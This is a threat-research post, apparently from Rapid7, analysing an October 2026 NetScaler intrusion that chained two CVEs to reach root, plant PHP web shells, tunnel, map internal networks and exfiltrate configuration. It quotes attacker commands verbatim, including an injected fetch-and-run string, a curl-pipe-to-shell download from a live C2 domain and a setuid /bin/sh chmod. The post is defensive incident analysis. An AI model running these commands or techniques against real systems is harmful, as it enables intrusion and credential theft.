---
title: Rapid7
author: Rapid7
url: https://www.rapid7.com/blog/post/ra-netscaler-intrusions-chaining-cve-2026-88771-and-cve-2026-88779/
hostname: rapid7.com
description: In early October 2026, Rapid7 analysts investigated a confirmed compromise of an anonymized Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments. The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material.
sitename: Rapid7
date: "2026-10-19"
categories: ['Threat Research']
tags: ['cybersecurity company,managed detection and response,exposure management,managed security solutions,vulnerability management,exposure assessment platform']
fingerprint: b59d8ed1e7bc8b90
---
## Overview

In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments.

The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material.

The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline.

## Key findings

- The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username.
- The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot.
- After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root.
- The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases.
- The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges.
- The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy.
- HA synchronization and forced failover logic attempted to preserve access across the appliance pair.
- A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems.
- NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration.

## Technical Analysis

### Initial access

The first event was an authentication request containing attacker-controlled text similar to:

`pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;#`
The observed chain was:

*Figure 1: Sequence diagram showing the attack chain*

Logs collected show attackers chaining [CVE-2026-88771](https://www.cve.org/CVERecord?id=CVE-2026-88771), the pre-authentication log-poisoning/RCE issue, with [CVE-2026-88779](https://www.cve.org/CVERecord?id=CVE-2026-88779), the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text.

The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed.

Rapid7 also published an [ETR](https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/) on the Netscaler zero days currently exploited in the wild.

### Repeated post-reboot execution

The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days.

The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collection after appliance restarts.

The crash-handling path functioned as a delayed and repeatable execution trampoline, the chaining happened to avoid waiting 24h for the injected payload to run.

## Payload evolution

Two .slap dropper versions were recovered:

```
17447d.sh (earlier version)
SHA-256: a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556
```
and:

```
1.sh 
SHA-256: 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44
```
The later version added reverse-agent functionality, relay installation, HA recovery, stage tracking, and structured upload logging, indicating operational maturation during the campaign.

The nsvmd installer branch was separately identified as:

```
2.sh / r.sh
SHA-256: 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186
```
## Persistence and web shells

The main framework used a directory under /nsconfig/.slap.

```
/nsconfig/.slap/vc
/nsconfig/.slap/vcscan-agent.sh
/nsconfig/.slap/agent.pl
/nsconfig/.slap/bridge.pl
/nsconfig/.slap/boot.sh
/nsconfig/.slap/reverse-agent.sh
```

It deployed three web shell copies into the LogonPoint custom web directory:

```
.slap.receiver
.ctxs.receiver
receiver.deb
```
The shells used a cookie-based command channel. Commands were supplied through a second cookie and returned through an HTTP 404 response body. The 404 response helped the shell blend into normal web traffic and made successful command requests resemble missing resources.

The attacker modified Apache configuration to:

- execute .deb files as PHP;
- enable PHP execution;
- map CSS-looking URLs to .slap.receiver;
- accept randomized hexadecimal CSS suffixes;
- preserve an attacker backup of the HTTP configuration.

The alias created were the following:

```
/logon/LogonPoint/custom/receiver.v2.min.css
/logon/LogonPoint/custom/receiver.v2.min.<hex>.css
        ↓
/var/netscaler/logon/LogonPoint/custom/.slap.receiver
```
TA repeatedly set:

`chmod 6555 /bin/sh`
This made the shell setuid and setgid. Because Apache normally runs with reduced privileges, this provided a path for the PHP web shell to obtain effective root privileges.

The framework also reseeded cron entries and boot hooks whenever it ran. This made the compromise resilient to reboots, image regeneration and loss of individual cron entries.

### Tunnelling and command channels

The intrusion deployed multiple redundant access paths.

### Perl TCP session manager

agent.pl created a loopback listener on an ephemeral port and recorded it in /tmp/.uxdport

It used /tmp/.uxdlock for process coordination and supported operations including:

```
ping
open
push
pull
exch
close
```
The open operation accepted arbitrary destination hosts and ports, turning the NetScaler into an internal TCP pivot.

### Python HTTP tunnel

The Python components provided a local session manager and HTTP front end:

it accepted base64 commands in an HTTP header and returned tunnel responses in HTTP 404 bodies. This behavior overlaps with publicly reported WHIPSHOT/SLAPSHOT tooling.

### Outbound reverse agent

The reverse agent polled an external command endpoint every 15 seconds, executed the received command with /bin/sh -c, and returned output using HTTP PUT. This gave the operator command execution without requiring an inbound connection to the appliance.

### HA-aware persistence

The framework included explicit HA recovery logic:

```
sync HA files all
force HA failover
```
The code attempted to synchronize implant files to the HA peer and, when appropriate, force failover so the node containing the implant became active.

## Internal reconnaissance

A stripped, statically linked FreeBSD Go binary was recovered from the .slap directory. The tool was designed to map infrastructure reachable from the compromised appliance.

It contains functionality associated with:

- local interface and route parsing;
- gateway-prefix discovery;
- subnet expansion;
- DNS server and domain discovery;
- DNS zone-transfer hunting;
- LDAP anonymous bind and RootDSE queries;
- LDAP searches;
- management-service checks;
- TLS certificate inspection;
- VMware vCenter classification.

A launcher named vcscan-agent.sh downloaded and validated the scanner as scanner-freebsd-amd64, installed it as /nsconfig/.slap/vc, and ran two stages: broad scanning of RFC1918 space and management-focused scanning of ranges derived from DNS and LDAP results. The launcher collected route, DNS, LDAP, management and vCenter results into files such as:

```
vcpersist-<token>_dns_candidates.tsv
vcpersist-<token>_dns_ldap_verified.tsv
vcpersist-<token>_vcenter_verified_all.txt
```
It then compressed and uploaded the results to the operator infrastructure.

This reconnaissance component addition confirms the campaign is active and developing, mapping the identity, management and virtualization infrastructure from a compromised ADC vantage point.

## nsvmd proxy

The second payload branch deployed a FreeBSD Go agent named nsvmd through injection of [2.sh/r.sh](http://2.sh/r.sh) under /flash/.nsvm/nsvmd:

`curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh`
The agent was started with:

`nsvmd -server v5v.in:443 -sni c.v5v.in`
The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, 5 minute and daily cron persistence (/flash/.nsvm/[guard.sh](http://guard.sh),/flash/.nsvm/restart.sh) marking nsvmd immutable using chflags uchg. Agent logs were collected under /flash/.nsvm/.agent.log and /flash/.nsvm/.wd.log.

### Configuration and key-material collection

The attacker staged and uploaded:

```
/nsconfig/
ns.conf.0 through ns.conf.4
ns.conf.bak
/etc/httpd.conf
system backup archives
implant diagnostics
```
The configuration archive could contain encrypted credentials, LDAP/RADIUS bind information, administrative configuration, SSL private keys and key-encryption material. The collection logic also uploaded manifests and stage logs and retried failed uploads.

A separate archive was staged in the web root and successfully downloaded through an HTTP 200 request. The response size matched the staged archive size, providing direct evidence of configuration exfiltration through the web interface.

## MITRE ATT&CK techniques

| **Technique ID** | **Technique Name** | **Tactic** | 
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access | 
| T1059.004 | Unix Shell | Execution | 
| T1059.006 | Python | Execution | 
| T1059.007 | JavaScript/PHP | Execution | 
| T1105 | Ingress Tool Transfer | Command and Control | 
| T1053.003 | Cron | Persistence | 
| T1037.004 | RC Scripts | Persistence | 
| T1505.003 | Web Shell | Persistence | 
| T1548.001 | Setuid and Setgid | Privilege Escalation | 
| T1027 | Obfuscated Files or Information | Defense Evasion | 
| T1070.004 | File and Directory Removal | Defense Evasion | 
| T1016 | System Network Configuration Discovery | Discovery | 
| T1018 | Remote System Discovery | Discovery | 
| T1046 | Network Service Scanning | Discovery | 
| T1090.001 | Internal Proxy | Command and Control | 
| T1552.001 | Credentials In Files | Credential Access | 
| T1005 | Data from Local System | Collection | 
| T1074.001 | Local Data Staging | Collection | 
| T1560.001 | Archive Collected Data | Collection | 
| T1071.001 | Web Protocols | Command and Control | 
| T1573 | Encrypted Channel | Command and Control | 
| T1132.001 | Standard Encoding | Command and Control | 
| T1572 | Protocol Tunneling | Command and Control | 
| T1041 | Exfiltration Over C2 Channel | Exfiltration | 
| T1020 | Automated Exfiltration | Exfiltration | 

*Table 1: MITRE ATT&CK Tactics and Techniques*

## Indicators of compromise

| **Path** | **Description** | 
|---|---|
| /nsconfig/.slap/ | Main framework directory | 
| /nsconfig/.relay/ | Relay implant directory | 
| /nsconfig/.slap/vc | Reconnaissance scanner binary | 
| /nsconfig/.slap/vcscan-agent.sh | Reconnaissance scanner launcher script | 
| /nsconfig/.slap/agent.pl | Perl TCP session manager and pivot agent | 
| /nsconfig/.slap/bridge.pl | Perl bridge script | 
| /nsconfig/.slap/boot.sh | Boot persistence script | 
| /nsconfig/.slap/reverse-agent.sh | Outbound reverse command execution agent | 
| /nsconfig/.relay/run.sh | Relay runner script | 
| /nsconfig/.relay/target\_agent.py | Python relay agent script | 
| /flash/.nsvm/nsvmd | FreeBSD Go proxy agent binary | 
| /flash/.nsvm/watchdog.sh | 45-second watchdog script for nsvmd | 
| /flash/.nsvm/guard.sh | Cron persistence guard script | 
| /flash/.nsvm/restart.sh | Daily restart script | 
| /flash/.nsvm/nsvmd.tmp | Temporary nsvmd binary path | 
| /flash/.nsvm/.stop | Uninstall/upgrade control marker | 
| /flash/.nsvm/.agent.log | Agent log file | 
| /flash/.nsvm/.wd.log | Watchdog log file | 
| /var/tmp/.s2loot/ | Loot staging directory | 
| /var/tmp/.ux/slapshot.py | Python HTTP tunnel/session manager component | 
| /var/tmp/.ux/whipd.py | Python HTTP tunnel front-end component | 
| /tmp/.uxdlock | Process coordination lock file | 
| /tmp/.uxdport | Ephemeral loopback port recording file | 
| /var/netscaler/logon/LogonPoint/custom/.slap.receiver | webshell | 
| /var/netscaler/logon/LogonPoint/custom/.ctxs.receiver | webshell | 
| /var/netscaler/logon/LogonPoint/custom/receiver.deb | webshell | 
| /nsconfig/.slap/.slap.receiver | Backup webshell copy | 
| /nsconfig/.slap/.ctxs.receiver | Backup webshell copy | 
| /nsconfig/.slap/receiver.deb | Backup webshell copy | 

*Table 2: Malicious files and filesystem paths*

| **SHA-256** | **Filename** | 
|---|---|
| 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44 | 1.sh | 
| a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556 | 17447d.sh | 
| 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186 | 2.sh / r.sh | 
| 8e8b9532ce40eacfe1b4cf2b11241878b70b910aabd90b453b1460df19b51a4d | scanner-freebsd-amd64 | 
| eaf0086237879bbaac00a5874c0e2ff84deede1ba10e6b706e2288fd3a31cdde | vc | 
| ffe052fc50271e7739d458b155df790438776032bfd125b974735e1dd9c0b138 | nsvmd | 

*Table 3: SHA-256 file hashes* 

| **Indicator** | **Notes** | 
|---|---|
| v5v.in | C2 domain used by nsvmd | 
| 209.74.64.192 | C2 used by nsvmd | 
| 192.159.99.139 | .slap C2, relay, reverse-agent and loot-upload infrastructure | 
| 213.209.159.55 | Stage server used to deliver /v, 1.sh/17447d.sh, and collect staged data | 
| 179.60.146.241 | IP serving 1.sh | 
| 45.92.1.17 | stage/loot infrastructure on port 30444 | 
| 62.133.62.80 | Payload delivery | 
| 46.151.182.18 | Payload delivery | 
| 132.243.166.140 | Payload delivery | 
| 199.233.217.13 | Payload delivery | 
| 31.56.197.72 | Payload delivery | 
| 64.94.85.67 | Payload delivery | 
| 130.94.20.222 | Payload delivery | 
| 173.231.39.244 | Payload delivery | 

*Table 4: Network indicators of compromise*

## Rapid7 customers

YARA rules and more IoCs are available in Rapid7’s Intelligence Hub along with ongoing intelligence on the latest campaigns.

## Defensive recommendations

- Patch NetScaler appliances to the applicable CVE-2026-88779 and CVE-2026-88771 fixed builds and verify the earlier CTX697096 fixes.
- Treat Internet-facing appliances as potentially compromised if they were vulnerable during the campaign window.
- Collect volatile evidence before rebooting or rebuilding when compromise is suspected.
- Inspect both nodes of every HA pair.
- Hunt for the .slap, .relay and .nsvm paths.
- Hunt for setuid /bin/sh, unauthorized Apache PHP handlers and CSS-looking aliases.
- Search for nsaaad crashes, Pitboss reboots and ns\_monuploadd\_err.pl execution records.
- Rotate all credentials and keys exposed through /nsconfig, including LDAP/RADIUS credentials and encryption-related material.
- Review outbound traffic for the listed infrastructure and internal scanning from NetScaler source addresses.

## Conclusion

This incident demonstrates how a NetScaler compromise can evolve from a pre-authentication injection into a persistent appliance-resident intrusion platform. The attacker combined web shells, setuid privilege persistence, outbound command execution, internal TCP tunnelling, HA manipulation, environment reconnaissance and automated configuration exfiltration.

The most significant new findings are the observed chaining of CVE-2026-88779 and CVE-2026-88771 and the dedicated reconnaissance workflow. Rather than using the ADC only as a foothold, the operator used it as a privileged vantage point to map internal networks, identity services, management infrastructure and virtualization systems. This provides defenders with additional high-value hunting opportunities and shows why patching alone is insufficient after an Internet-facing NetScaler has been exposed to active exploitation.

## Additional resources

- [https://www.cve.org/CVERecord?id=CVE-2026-88771](https://www.cve.org/CVERecord?id=CVE-2026-88771)
- [https://www.cve.org/CVERecord?id=CVE-2026-88779](https://www.cve.org/CVERecord?id=CVE-2026-88779)
- [https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/](https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/)
- [https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/](https://www.rapid7.com/blog/post/etr-zero-day-exploitation-of-citrix-netscaler-adc-and-gateway-cve-2026-88771-and-cve-2026-88772/)
- [https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway](https://www.cisa.gov/news-events/alerts/2026/09/27/critical-zero-day-vulnerabilities-exploited-citrix-netscaler-adc-gateway)
- [https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/](https://unit42.paloaltonetworks.com/netscaler-zero-days-exploited/)
